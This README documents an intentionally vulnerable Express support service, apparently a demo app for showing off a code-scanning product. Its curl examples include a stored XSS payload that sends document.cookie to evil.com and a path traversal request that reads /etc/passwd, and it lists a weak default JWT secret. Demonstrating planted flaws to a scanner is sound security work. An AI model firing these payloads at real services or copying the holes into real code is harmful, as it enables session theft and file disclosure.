# banking-app-support — Support Service

> Part of the **Mock Consumer Banking App** — a security demo for [Aikido Security](https://www.aikido.dev).

Node.js 20 / Express support service. Handles customer service tickets, message threads, and file attachments. **Intentionally vulnerable** — findings surface in Aikido SAST scanning.

---

## Intentional Vulnerabilities

| Vulnerability | Location | Aikido Category |
|--------------|----------|-----------------|
| Stored XSS in ticket messages | `src/routes/messages.js:29` | SAST |
| Path traversal in file download | `src/routes/attachments.js:38` | SAST |
| Stack traces in 500 responses | `src/index.js:error handler` | SAST |

---

## Quick Start

### Standalone (with Docker)

```bash
docker compose up
```

Service starts on port **8004**.

### Local development

```bash
cp .env.example .env
npm install
npm start
```

---

## API

| Method | Path | Auth | Description |
|--------|------|------|-------------|
| `POST` | `/tickets` | Bearer | Open support ticket |
| `GET` | `/tickets` | Bearer | List your tickets |
| `GET` | `/tickets/:id` | Bearer | Get ticket with messages |
| `POST` | `/tickets/:id/messages` | Bearer | **[VULN XSS]** Post message |
| `POST` | `/attachments/upload` | Bearer | Upload file |
| `GET` | `/attachments/download/:filename` | Bearer | **[VULN Traversal]** Download file |
| `GET` | `/health` | No | Health check |

---

## curl Examples

```bash
TOKEN=<your_jwt>
```

### Create ticket

```bash
curl -s -X POST http://localhost:8004/tickets \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"subject":"My card is not working"}' | jq
```

### List tickets

```bash
curl -s http://localhost:8004/tickets \
  -H "Authorization: Bearer $TOKEN" | jq
```

### Stored XSS demo

```bash
# The script tag is stored unescaped and returned in GET /tickets/:id
curl -s -X POST http://localhost:8004/tickets/<TICKET_ID>/messages \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"body":"<script>fetch(\"https://evil.com?c=\"+document.cookie)</script>"}' | jq
```

### Upload attachment

```bash
curl -s -X POST http://localhost:8004/attachments/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/path/to/file.pdf" | jq
```

### Path traversal demo

```bash
# Traverse out of uploads/ into the filesystem
curl -s "http://localhost:8004/attachments/download/../../etc/passwd" \
  -H "Authorization: Bearer $TOKEN"
```

### Trigger 500 error with stack trace

```bash
# Any server error returns full err.stack in the response body
curl -s http://localhost:8004/tickets/not-a-valid-uuid \
  -H "Authorization: Bearer $TOKEN" | jq '.stack'
```

---

## Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `DATABASE_URL` | `postgresql://banking:banking@localhost:5432/banking` | PostgreSQL connection string |
| `JWT_SECRET` | `supersecret123` | JWT verification secret |
| `PORT` | `8004` | Service port |
